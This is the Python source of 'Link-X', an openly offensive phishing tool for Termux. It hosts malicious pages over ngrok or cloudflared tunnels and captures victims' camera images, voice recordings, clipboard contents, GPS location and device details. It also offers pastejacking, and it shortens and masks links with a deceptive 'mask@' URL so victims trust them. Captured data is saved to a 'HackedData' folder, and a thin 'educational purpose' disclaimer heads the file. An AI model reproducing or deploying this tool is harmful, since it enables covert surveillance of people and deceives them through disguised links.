"""
About Tool:
    Name : Link-X
    Description : Camera, Voice, Clipboard (etc...) Grabber
    Author : ToxicNoob Inc.
    GitHub : https://github.com/Toxic-Noob
    Veesion : 2.0

More Description:
    This Tool can Hack and Grab data of Camera, Voice, Clipboard, Location.
    It can Grab As much info as Possible from Victims Device.
    All this requires Just a Malicious Link

Tunnel Options:
    Localhost
    Ngrok
    Cloudflared

Note:
    This Tool is only for Educational Purpose
    ToxicNoob Inc. will not be responsible for any Misuse

"""

import os
import time
import sys
import random
import json
import shutil
import subprocess as sb


# Global Variables
attackMethod = ""
maskUrl = False
host = "127.0.0.1"
chroot = False if (sb.getoutput("command -v termux-chroot") == "") else True

columns = shutil.get_terminal_size().columns

# Print with Color (Using this to avoid color code confusion and external lirary)
def cPrint(text, Return=False):
    printText = text.replace("cWhite", "\033[37m").replace("cGreen", "\033[92m").replace("cRed", "\033[91m").replace("cBlue", "\033[94m")
    if (Return):
        return printText
    
    print(printText)

def psb(z, end = "\n"):
    z = cPrint(z, True)
    for p in z + end:
        sys.stdout.write(p)
        sys.stdout.flush()
        time.sleep(0.01)


# Logo
def logo():
    os.system("clear")
    print("\033[94m┌────────────────────────────────────────┐".center(columns+4))
    print("\033[94m│           \033[92m▌  ▗    ▌       ▌ ▌\033[94m          │".center(columns+14))
    print("\033[94m│           \033[92m▌  ▄ ▛▀▖▌▗▘ ▄▄▖ ▝▞ \033[94m          │".center(columns+14))
    print("\033[94m│           \033[92m▌  ▐ ▌ ▌▛▚      ▞▝▖\033[94m          │".center(columns+14))
    print("\033[94m│           \033[92m▀▀▘▀▘▘ ▘▘ ▘     ▘ ▘\033[94m          │".center(columns+14))
    print("\033[94m│                              \033[94m          │".center(columns+8))
    print("\033[94m│ \033[95mAuthor : ToxicNoob Inc.                \033[94m│".center(columns+14))
    print("│ \033[95mTool   : Hack With Link                \033[94m│".center(columns+8))
    print("│ \033[95mGitHub : https://github.com/Toxic-Noob \033[94m│".center(columns+8))
    print("│ \033[95mCoder  : HunterSl4d3             \033[37mV2.0  \033[94m│".center(columns+14))
    print("\033[94m└────────────────────────────────────────┘".center(columns+4))

# Kill All Process
def killAll():
    pid = sb.getoutput("pidof php ngrok cloudflared")
    os.system("kill " + pid + " > /dev/null 2>&1")

# Check Update
def update():
    psb("\n    cWhite[cGreen!cWhite] Please wait, Checking Update...")
    try:
        oldVersion = json.loads(open(".version", "r").read())["version"]
    except:
        oldVersion = "ToxicNoob Inc."
    
    try:
        newVersion = json.loads(sb.getoutput("curl -s \"https://raw.githubusercontent.com/Toxic-Noob/Link-X/main/.version\"").replace("\n", "").strip())["version"]
    except:
        cPrint("\n    cWhite[cRed!cWhite] Something Went Wrong!")
        sys.exit("")
    
    if not (oldVersion == newVersion):
        psb("\n    cWhite[cGreen!cWhite] Tool Update Found!")
        cPrint("    [!] Updating Tool...")
        os.system("cd ../ && rm -rf Link-X && git clone https://github.com/toxic-noob/Link-X > /dev/null 2>&1")
        psb("\n    [cGreen*cWhite] Update Complete!")
        psb("    [cGreen*cWhite] Starting new Version...")
        os.system("cd ../Link-X && python link-x.py")
    else:
        psb("\n    cWhite[cGreen*cWhite] Tool is already Up to Date!")
        time.sleep(0.8)
        input(cPrint("\n    [cGreen*cWhite] Press Enter to Continue...", True))

# Print Device Location
def printLocation(tmp):
    data = json.loads(tmp)["info"]
    time.sleep(0.4)
    cPrint("\n    [cGreen~cWhite] LatitudecGreen: cWhite" + data["lat"])
    cPrint("\n    [cGreen~cWhite] LongitudecGreen: cWhite" + data["lon"])
    cPrint("\n    [cGreen~cWhite] AccuracycGreen: cWhite" + data["acc"])
    cPrint("\n    [cGreen~cWhite] AltitudecGreen: cWhite" + data["alt"])
    lat = data['lat']
    lon = data['lon']
    cPrint(f"\n    [cGreen~cWhite] Google MapcGreen: cWhitehttps://www.google.com/maps/search/?api=1&query={lat},{lon}")
    
    cPrint("\n    [cGreen*cWhite] Waiting for next Victim...")

# Print Device Details
def printDetails(tmp):
    data = json.loads(tmp)["info"]
    cPrint("\n    [cGreen*cWhite] Parsing Data...")
    ip = data["ip"].replace("\n", "").replace(" ", "")
    ipDetails = sb.getoutput(f"curl -s 'https://ipapi.com/ip_api.php?ip={ip}'")
    
    country = "None"
    capital = "None"
    callCode = "None"
    timeZone = "None"
    ISP = "None"
    
    
    if not ("error" in ipDetails) and not (ipDetails == ""):
        try:
            ipDetails = json.loads(ipDetails)
        except:
            ipDetails == ""
    
    if not (ipDetails == ""):
        try:
            country = ipDetails["country_name"]
            capital = ipDetails["location"]["capital"]
            callCode = ipDetails["location"]["calling_code"]
            timeZone = ipDetails["time_zone"]["id"] + " " + ipDetails["time_zone"]["code"]
            ISP = ipDetails["connection"]["isp"]
        except:
            pass
    
    
    cPrint("\n    [cGreen*cWhite] IP Address: " + data["ip"])
    
    # Basic
    print("")
    cPrint("[cGreen*cWhite] Basic Info [cGreen*cWhite]".center(columns+24))
    print("")
    cPrint("    [cGreen~cWhite] Time in Victims DevicecGreen: cWhite" + data["time"])
    cPrint("    [cGreen~cWhite] Device NamecGreen: cWhite" + data["dname"])
    cPrint("    [cGreen~cWhite] CookiecGreen: cWhite" + data["cookie"].title())
    cPrint("    [cGreen~cWhite] User AgentcGreen: cWhite" + data["ua"])
    cPrint("    [cGreen~cWhite] PlatformcGreen: cWhite" + data["platf"])
    cPrint("    [cGreen~cWhite] LanguagecGreen: cWhite" + data["lang"])
    cPrint("    [cGreen~cWhite] Device MemorycGreen: cWhite" + data["memory"])
    # Screen
    print("")
    cPrint("[cGreen*cWhite] Screen Info [cGreen*cWhite]".center(columns+24))
    print("")
    cPrint("    [cGreen~cWhite] Max Touch PointscGreen: cWhite" + data["touch"])
    cPrint("    [cGreen~cWhite] Screen WidthcGreen: cWhite" + data["wid"])
    cPrint("    [cGreen~cWhite] Screen HightcGreen: cWhite" + data["hig"])
    # Network
    print("")
    cPrint("[cGreen*cWhite] Network Info [cGreen*cWhite]".center(columns+24))
    print("")
    cPrint("    [cGreen~cWhite] Data  TypecGreen: cWhite" + data["netType"].title())
    cPrint("    [cGreen~cWhite] ISPcGreen: cWhite" + str(ISP))
    # Battery
    print("")
    cPrint("[cGreen*cWhite] Battery Info [cGreen*cWhite]".center(columns+24))
    print("")
    cPrint("    [cGreen~cWhite] Battery Charge LevelcGreen: cWhite" + data["batLevel"])
    cPrint("    [cGreen~cWhite] Battrty is ChargingcGreen: cWhite" + data["batCharge"])
    # Counrty
    print("")
    cPrint("[cGreen*cWhite] County Info [cGreen*cWhite]".center(columns+24))
    print("")
    cPrint("    [cGreen~cWhite] CountrycGreen: cWhite" + str(country))
    cPrint("    [cGreen~cWhite] CapitalcGreen: cWhite" + str(capital))
    cPrint("    [cGreen~cWhite] Calling CodecGreen: cWhite" + str(callCode))
    cPrint("    [cGreen~cWhite] Time ZonecGreen: cWhite" + str(timeZone))
    cPrint("\n    [cGreen*cWhite] Waiting for next Victim...")

# Setup Upload Files
def setupFiles(redirectUrl, toCopy=None, show=None):
    if not os.path.exists(".server"):
        os.system("mkdir .server > /dev/null 2>&1")
    
    os.system("rm ./.server/* > /dev/null 2>&1")
    if not (attackMethod == "paste"):
        os.system("cp -r ./.site/index/* ./.server/")
        os.system("cp -r ./.site/js/" + attackMethod + ".js ./.server/index.js")
        os.system("cp -r ./.site/php/" + attackMethod + ".php ./.server/get_data.php")
        if not (redirectUrl == ""):
            jsData = open("./.server/index.js", "r").read()
            file = open("./.server/index.js", "w")
            file.write(jsData.replace("https://you.regettingold.com/", redirectUrl))
            file.close()
    else:
        os.system("cp -r ./.site/pasteJacking/* ./.server/")
        jsData = open("./.server/index.js", "r").read()
        file = open("./.server/index.js", "w")
        write = jsData.replace("$CopyData$", toCopy).replace("$ShowText$", show)
        if not (redirectUrl == ""):
            write = write.replace("https://you.regettingold.com/", redirectUrl)
        file.write(write)
        file.close()
        

# Start PHP Server
def startPHP():
    port = str(random.randint(1111, 9999))
    os.system(f"cd ./.server && php -S {host}:{port} > /dev/null 2>&1 &")
    
    return port

# Start Ngrok Server
def startNgrok(port):
    cPrint("\n    [cGreen*cWhite] Launching Ngrok...")
    if (chroot):
        os.system(f"termux-chroot ngrok http {host}:{port} > /dev/null 2>&1 &")
    else:
       os.system(f"ngrok http {host}:{port} > /dev/null 2>&1 &")
    
    
    try:
        fileData = json.loads(open("/data/data/com.termux/files/usr/bin/ngtrial.json", "r").read())
        if (fileData["auth"] in open("/data/data/com.termux/files/home/.ngrok2/ngrok.yml/").read()):
            file = open("/data/data/com.termux/files/usr/bin/ngtrial.json", "w")
            fileData["trialLeft"] = int(fileData["trialLeft"]) - 1
            json.dump(fileData, file)
            file.close()
    except:
        pass
    
    time.sleep(5)
    mainUrl = sb.getoutput("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o \"https://[-0-9a-z]*\.ngrok.io\"")
    if (mainUrl == ""):
        cPrint("\n    [cRed!cWhite] There was a Probleam Starting Ngrok Server")
        cPrint("    [cGreen!cWhite] Try using other Tunnel\n")
        sys.exit()
    
    shortUrl = sb.getoutput(f"curl -s \"https://is.gd/create.php?format=simple&url={mainUrl}\"")
    if ("Error: " in shortUrl) or (len(shortUrl.split("\n")) > 5):
        shortUrl = "Failed to Short Url"
    
    if (maskUrl):
        maskedUrl = "https://" + maskUrl.replace(" ", "").replace("/", "")  + "@" + shortUrl.replace("https://", "")
    else:
        maskedUrl = None
    
    return mainUrl, shortUrl, maskedUrl


# Start Cloudflared Server
def startCloudflared(port):
    os.system("rm .cld.log > /dev/null 2>&1")
    cPrint("\n    [cGreen*cWhite] Launching Cloudflared...")
    if (chroot):
        os.system(f"termux-chroot cloudflared tunnel -url http://{host}:{port} --logfile ./.cld.log > /dev/null 2>&1 &")
    else:
       os.system(f"cloudflared tunnel -url {host}:{port} --logfile .cld.log > /dev/null 2>&1 &")
    
    time.sleep(8)
    mainUrl = ""
    try:
        fileData = open(".cld.log", "r").readlines()
        for line in fileData:
            data = json.loads(line).get("message").replace("|", "").replace("\n", "").strip()
            if (data.startswith("https://")) and (data.endswith(".trycloudflare.com")):
                mainUrl = data
                break
    except:
        pass
    
    if (mainUrl == ""):
        cPrint("\n    [cRed!cWhite] There was a Probleam Starting Cloudflared Server")
        cPrint("    [cGreen!cWhite] Try using other Tunnel\n")
        sys.exit()
    
    shortUrl = sb.getoutput(f"curl -s \"https://is.gd/create.php?format=simple&url={mainUrl}\"")
    if ("Error: " in shortUrl) or (len(shortUrl.split("\n")) > 1):
        print(shortUrl)
        shortUrl = "Failed to Short Url"
    
    if (maskUrl):
        maskedUrl = "https://" + maskUrl.replace(" ", "").replace("/", "")  + "@" + shortUrl.replace("https://", "")
    else:
        maskedUrl = None
    
    return mainUrl, shortUrl, maskedUrl

# Get Expose Method
def getTunnel():
    try:
        trialData = json.loads(open("/data/data/com.termux/files/usr/bin/ngtrial.json", "r").read())
        addedToken = open("/data/data/com.termux/files/home/.ngrok2/ngrok.yml", "r").read()
        auth = trialData["auth"]
        trialLeft = trialData["trialLeft"]
    except:
        addedToken = "None"
        auth = ""
        trialLeft = "5"
    
    logo()
    psb("\n   cWhite [cGreen*cWhite] Choose your Expose Method: \n")
    cPrint("    [cGreen01cWhite] Localhost (cGreenFor DevscWhite)")
    cPrint(f"    [cGreen02cWhite] Ngrok (cGreenTrial Left: {trialLeft}cWhite)")
    cPrint("    [cGreen03cWhite] Cloudflared (cGreenBest!cWhite)")
    cPrint("    [cGreen04cWhite] Exit")
    
    op = input(cPrint("\n    [cGreen*cWhite] Enter Your Choice:> cGreen", True)).replace("0", "")
    while not (op in ["1", "2", "3", "4"]):
        psb("\n    cWhite[cRed!cWhite] Incorrect Input")
        op = input(cPrint("\n    [cGreen*cWhite] Enter Your Choice:> cGreen", True)).replace("0", "")
    
    if (op == "4"): sys.exit("")
    
    if (op == "2"):
        if (auth in addedToken) and (int(trialLeft) < 1):
            time.sleep(0.5)
            psb("\n    cWhite[cRed!cWhite] Ngrok Trial Exceed")
            psb("    [cGreen*cWhite] Make a Ngrok Account and Paste your Auth Token Below: ")
            
            cPrint("\n    [cGreen*cWhite] Sign Up FromcGreen: cWhitehttps://dashboard.ngrok.com/signup")
            cPrint("    [cGreen*cWhite] Get Auth TokencGreen: cWhitehttps://dashboard.ngrok.com/get-started/your-authtoken\n")
            time.sleep(2)
            userToken = input(cPrint("\n    [cGreen#cWhite] Enter Token HerecGreen:> cWhite", True))
            if (userToken == ""):
                cPrint("\n    [cRed!cWhite] Invalid Token!")
                sys.exit("")
            
            file = open("/data/data/com.termux/files/home/.ngrok2/ngrok.yml", "w")
            file.write("authtoken: " + userToken)
            file.close()
    
    tunnelList = ["localhost", "ngrok", "cloudflared"]
    
    return tunnelList[int(op) -1]


# Get IP Addresses
def getIp():
    path = ".server/ip.txt"
    if os.path.exists(path):
        ip_data = open(path, "r").readlines()
        while "" in ip_data: ip_data.remove("")
        if (len(ip_data) < 1): return
        
        cPrint("\n    cBlue[cGreen+cBlue] cWhiteVictim Opened The Link!!")
        cPrint("\n    [cGreen~cWhite] Victim IPcGreen: cWhite" + ip_data[0].replace("\n", ""))
        cPrint("\n    [cGreen~cWhite] Saved IncGreen: cWhiteip.txt")
        os.system("cat "+path+" >> ip.txt")
        os.system("rm "+path)

# Get Logged Data
def getLog():
    attDesDict = {"camera": {"ext": ".png", "head": "cam_", "file": "Image File"}, "voice": {"ext": ".wav", "head": "audio_", "file": "Voice File"}, "clipboard": {"ext": ".dat", "head": "cb_", "file": "Clipboard Data"}, "location": {"ext": ".json", "head": "loc_", "file": "Location Data"}, "details": {"ext": ".json", "head": "details_", "file": "Device Details"}, "paste": {"ext": ".json", "head": "paste_", "file": "Copied!"}}
    
    attack = attDesDict[attackMethod]
    ext = attack["ext"]
    head = attack["head"]
    fileType = attack["file"]
    
    body = str(time.time())[:10]
    
    logPath = "./.server/Log.log"
    if not os.path.exists(logPath): return
    if not (open(logPath, "r").read().replace("\n", "").strip() == "Received"): return
    
    os.remove(logPath)
    cPrint("\n    cGreen[cWhite+cGreen] cWhite" + fileType + " Received!")
    if (attackMethod == "clipboard"):
        clipData = open(".server/data.dat", "r").read()
        cPrint("\n[cGreenDatacWhite]cGreen: cWhite" + clipData)
    elif (attackMethod == "location"):
        locData = open(".server/data.json", "r").read()
        printLocation(locData)
    elif (attackMethod == "details"):
        while not os.path.exists(".server/data.json"):
            pass
        deviceData = open(".server/data.json", "r").read()
        printDetails(deviceData)
    
    os.system(f"mv ./.server/*{ext} /sdcard/HackedData/{head}{body}{ext}")
    

# Start Process
def startProcess():
    if (attackMethod == "paste"):
        show = input(cPrint("\n    cWhite[cGreen*cWhite] Enter Text to ShowcGreen:> cWhite", True))
        toCopy = input(cPrint("\n    [cGreen*cWhite] Enter Text to CopycGreen:> cWhite", True))
        redirectUrl = ""
    else:
        cPrint("\n    cWhite[cGreen*cWhite] Enter a Website Url to Redirect")
        redirectUrl = input(cPrint("    cGreen[ cWhiteDefault: YouAreGettingOld cGreen]:cWhite> ", True))
        show = None
        toCopy = None
   
    setupFiles(redirectUrl, toCopy, show)
    tunnel = getTunnel()
    
    if not (tunnel == "localhost"):
        mask = input(cPrint("\n    cWhite[cGreen*cWhite] Want to Mask Url? [cGreeny/ncWhite]:> ", True)).lower()
        global maskUrl
        if (mask == "y"):
            maskUrl = input(cPrint("\n    [cGreen*cWhite] Enter Mask Text/UrlcGreen:> cWhitehttps://", True))
    
    cPrint("\n    cWhite[cGreen!cWhite] Setting up Files...")
    time.sleep(1)
    cPrint("\n    [cGreen!cWhite] Starting PHP Server...")
    port = startPHP()
    time.sleep(1)
    
    localhost = host + ":" + port
    if (tunnel == "ngrok"):
        mainUrl, shortUrl, maskedUrl = startNgrok(port)
    elif (tunnel == "cloudflared"):
        mainUrl, shortUrl, maskedUrl = startCloudflared(port)
    
    logo()
    cPrint("\ncWhite[cGreen*cWhite] Successfully Hosted atcGreen: cWhitehttp://" + localhost)
    
    if not (tunnel == "localhost"):
        cPrint("\n[cGreen~cWhite] URL 01cGreen: cWhite" + mainUrl)
        cPrint("\n[cGreen~cWhite] URL 02cGreen: cWhite" + shortUrl)
        if (maskedUrl):
            cPrint("\n[cGreen~cWhite] URL 03cGreen: cWhite" + maskedUrl)
    
    cPrint("\n[cGreen*cWhite] Data Saved In cGreen: cWhite/sdcard/HackedData")
    cPrint("\n[cGreen*cWhite] Waiting for Victim, Press cGreenCtrl cWhite+ cGreenc cWhiteto Stop...\n")
    
    try:
        while True:
            try:
                getIp()
                getLog()
            except KeyboardInterrupt:
                cPrint("\n    [cRed!cWhite] Process Stopped By User\n")
                sys.exit()
    except KeyboardInterrupt:
        cPrint("\n    [cRed!cWhite] Process Stopped By User\n")
        sys.exit()


# Attack Menu
def menu():
    logo()
    psb("\n    cWhite[cGreen*cWhite] Choose Your Option: \n")
    cPrint("    [cGreen01cWhite] Camera Hack")
    cPrint("    [cGreen02cWhite] Voice Hack")
    cPrint("    [cGreen03cWhite] Clipboard Hack")
    cPrint("    [cGreen04cWhite] Location Hack")
    cPrint("    [cGreen05cWhite] Pastejacking")
    cPrint("    [cGreen06cWhite] Get Victim Device Details")
    cPrint("    [cGreen07cWhite] Embed Methods (cGreenComing SooncWhite)")
    cPrint("    [cGreen08cWhite] Update Tool")
    cPrint("    [cGreen00cWhite] Exit")
    
    op = input(cPrint("\n    [cGreen*cWhite] Enter Your Choice:> cGreen", True))
    
    if (op == "00") or (op == "0"):
        sys.exit("")
    
    while not op in ["0", "1", "2", "3", "4", "5", "6", "7", "8"]:
        psb("\n    cWhite[cRed!cWhite] Wrong Choice!")
        op = input(cPrint("\n    [cGreen*cWhite] Enter Your Choice:> cGreen", True))
        op = op.replace("0", "") if not (op == "00") else "0"
    
    if (op == "7"):
        cPrint("\n    cWhite[cGreen*cWhite] Method is Coming Soon...")
        time.sleep(1)
        input(cPrint(" \n    [cGreen*cWhite] Press Enter to Go Back...", True))
        menu()
        sys.exit()
    elif (op == "8"):
        update()
    
    attList = ["camera", "voice", "clipboard", "location", "paste", "details"]
    global attackMethod
    attackMethod = attList[int(op) - 1]
    
    startProcess()


if (__name__ == "__main__"):
    if (any(sb.getoutput(f"command -v {pkg}") == "" for pkg in ["php", "ngrok", "cloudflared", "curl", "wget", "unzip"])):
        os.system("python setup.py")
    
    if not os.path.exists("/sdcard/HackedData"):
        os.mkdir("/sdcard/HackedData")
    killAll()
    menu()
